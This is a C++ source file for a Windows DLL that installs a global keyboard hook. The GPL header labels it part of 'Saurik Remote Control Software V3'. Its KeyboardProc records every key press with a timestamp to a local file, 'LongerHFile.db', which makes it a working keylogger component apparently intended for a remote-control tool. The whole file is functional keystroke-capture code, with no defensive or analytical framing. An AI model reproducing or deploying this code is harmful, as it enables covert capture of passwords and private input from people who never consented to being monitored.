// dllmain.cpp : 定义 DLL 应用程序的入口点。

/*
*                    GNU GENERAL PUBLIC LICENSE
*                       Version 3, 29 June 2007
*
* Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
* Everyone is permitted to copy and distribute verbatim copies
* of this license document, but changing it is not allowed.
* 
* Saurik Remote Control Software V3 is under a GPLv3 Licence. You can share or change those code under licence.
*/

#include "stdafx.h"
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <cstring>
#include <time.h>
using namespace std;
//全局变量   
HHOOK g_hook = NULL;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	//保存模块实例句柄   
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		if (g_hook)
		UnhookWindowsHookEx(g_hook);
		break;
	}
	return TRUE;
}
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if ((lParam >> 31 & 1) == 0)
	{
		time_t rawtime;
		struct tm timeinfo;
		time(&rawtime);
		localtime_s(&timeinfo, &rawtime);
		char iCharData[sizeof(WPARAM) + 1];
		sprintf(iCharData, "%c", wParam);
		ofstream _Longer("LongerHFile.db", ios::out | ios::app);
		if (_Longer)
		{
			if (_Longer.tellp() > 12580ULL)
			{
				_Longer.close();
				_Longer.clear();
				_Longer.open("LongerHFile.db", ios::out);
			}
			_Longer << asctime(&timeinfo) << " Pressed " << iCharData << endl;
			_Longer.close();
		}
		else
		{
		}
	}
	return CallNextHookEx(g_hook, code, wParam, lParam);
}
extern "C" _declspec (dllexport) void SetupHook()
{
	g_hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(TEXT("KeyBGeko.mod")), NULL);
	if (g_hook == NULL)
	{
		return;
	}
	return;
}
extern "C" _declspec (dllexport) void UnHook()
{
	if (g_hook)
		UnhookWindowsHookEx(g_hook);
	g_hook = NULL;
}
